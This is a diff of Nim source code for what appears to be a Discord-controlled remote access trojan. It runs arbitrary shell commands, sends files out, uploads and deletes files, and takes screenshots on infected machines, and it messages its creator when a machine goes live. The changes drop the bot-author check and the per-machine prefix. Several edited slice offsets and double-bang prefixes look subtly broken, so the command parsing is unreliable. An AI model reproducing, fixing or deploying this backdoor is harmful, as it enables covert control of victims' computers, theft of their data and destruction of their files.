@@ -61,7 +61,8 @@ proc sendFile(channelId: string, filePath: string, fileName: string): Future[voi
         files = @[DiscordFile(name: fileName, body: fileContent)]
     )
 
-proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] {.async.} =
+proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[string] {.async.} = 
+  let cmd = rawCmd.strip()
   if cmd == "!dir" or cmd == "!ls":
     when defined(windows):
       let (output, exitCode) = execCmdEx("cmd /c dir", options = {poUsePath}, workingDir = currentDir)
@@ -77,7 +78,7 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
         return output
 
   elif cmd.startsWith("!cd "):
-    let newDir = cmd[4..^1].strip()
+    let newDir = cmd[3..^1].strip()
     let targetDir = if os.isAbsolute(newDir): newDir else: os.joinPath(currentDir, newDir)
     if dirExists(targetDir):
       setCurrentDir(targetDir)
@@ -86,7 +87,7 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
     else:
       return "directory not found: " & targetDir
 
-  elif cmd == "!upload":
+  elif cmd.startsWith("!upload"):
     if m.attachments.len == 0:
       return "no file attached. Please send a file with the !upload command."
     else:
@@ -101,8 +102,8 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
       except CatchableError as e:
         return "failed to download file: " & e.msg
 
-  elif cmd.startsWith("!download "):
-    let fileName = cmd[10..^1].strip()
+  elif cmd.startsWith("!!download "):
+    let fileName = cmd[9..^1].strip()
     let filePath = os.joinPath(currentDir, fileName)
     if fileExists(filePath):
       await sendFile(m.channel_id, filePath, fileName)
@@ -110,8 +111,8 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
     else:
       return "file not found: " & filePath
 
-  elif cmd.startsWith("!mkdir "):
-    let dirName = cmd[7..^1].strip()
+  elif cmd.startsWith("!!mkdir "):
+    let dirName = cmd[6..^1].strip()
     let dirPath = os.joinPath(currentDir, dirName)
     try:
       createDir(dirPath)
@@ -120,7 +121,7 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
       return e.msg
 
   elif cmd.startsWith("!touch "):
-    let fileName = cmd[7..^1].strip()
+    let fileName = cmd[6..^1].strip()
     let filePath = os.joinPath(currentDir, fileName)
     try:
       writeFile(filePath, "")
@@ -129,7 +130,7 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
       return e.msg
 
   elif cmd.startsWith("!rm "):
-    let target = cmd[4..^1].strip()
+    let target = cmd[3..^1].strip()
     let path = os.joinPath(currentDir, target)
     if fileExists(path):
       try:
@@ -140,13 +141,13 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
     elif dirExists(path):
       try:
         removeDir(path)
-        return "deleted directory: " & path
+        return "deleted directory: " & path 
       except CatchableError as e:
         return e.msg
     else:
       return "no such file or directory: " & path
 
-  elif cmd == "!screencapture":
+  elif cmd == "!!screencapture":
     when defined(macosx):
       let fileName = "screenshot_" & $now().toTime().toUnix() & ".jpg"
       let filePath = os.joinPath(currentDir, fileName)
@@ -180,14 +181,14 @@ proc handleCommand(cmd: string, m: Message, client: HttpClient): Future[string] 
 
   else:
     try:
+      let command = cmd[1..^1]
       when defined(macosx):
-        let command = cmd[1..^1]
         return await runCommandWithTimeoutKill(command, 60000)
       elif defined(windows):
-        let command = "cmd /c " & cmd[1..^1]
+        let command = "cmd /c " & command
         return await runCommandWithTimeoutKill(command, 60000)
       else:
-        return "unsupported platform for command execution."
+        return "unsupported platform for direct command execution."
     except CatchableError as e:
       return "error running command: " & e.msg
 
@@ -208,40 +209,37 @@ proc getHostname(): string =
 var machineName = getEnv("MACHINE_NAME", getHostname())
 
 proc onReady(s: Shard, r: Ready) {.event(discord).} =
-  let dm = await discord.api.createUserDm(creatorId)
-  if machineName notin sessionRegistry:
-    sessionRegistry.add(machineName)
-  discard await discord.api.sendMessage(dm.id, machineName & " IS LIVE <3")
+  try:
+    let dm = await discord.api.createUserDm(creatorId)
+    if machineName notin sessionRegistry:
+      sessionRegistry.add(machineName)
+    discard await discord.api.sendMessage(dm.id, machineName & " IS LIVE <3")
+  except:
+    echo "Could not send startup message to creator ID: ", creatorId
 
 proc messageCreate(s: Shard, m: Message) {.event(discord).} =
-  if m.author.bot: return
-
   var client = newHttpClient()
   let content = m.content.strip()
+  echo "Processing command: ", content
 
   if content == "!sessions":
-    let sessionList = if sessionRegistry.len == 0: "no active sessions." else: sessionRegistry.join("\n")
+    let sessionList = if sessionRegistry.len == 0: "No active sessions." else: sessionRegistry.join("\n")
     discard await sendMessage(m.channel_id, sessionList)
     return
-
-  if content.startsWith("!" & machineName & " "):
-    let cmd = content[(machineName.len + 2)..^1].strip()
-    echo cmd
-    try:
-      let output = await handleCommand(cmd, m, client)
-      discard await sendMessage(m.channel_id, output)
-    except CatchableError as e:
-      discard await sendMessage(m.channel_id, e.msg)
-    return
-
-  if content == "!ping":
+  elif content == "!ping":
     let before = epochTime() * 1000
     let msg = await discord.api.sendMessage(m.channel_id, "ping?")
     let after = epochTime() * 1000
     discard await discord.api.editMessage(m.channel_id, msg.id, "pong! took " & $int(after - before) & "ms | " & $s.latency() & "ms.")
+    return
+  
+  if content.startsWith("!"):
+    try:
+      let output = await handleCommand(content, m, client)
+      discard await sendMessage(m.channel_id, output)
+    except CatchableError as e:
+      echo "Error executing command: ", e.msg
+      discard await sendMessage(m.channel_id, e.msg)
 
-proc main() = 
-  when isMainModule:
-    waitFor discord.startSession()
-  else:
-    discard
+proc main() =
+  waitFor discord.startSession()
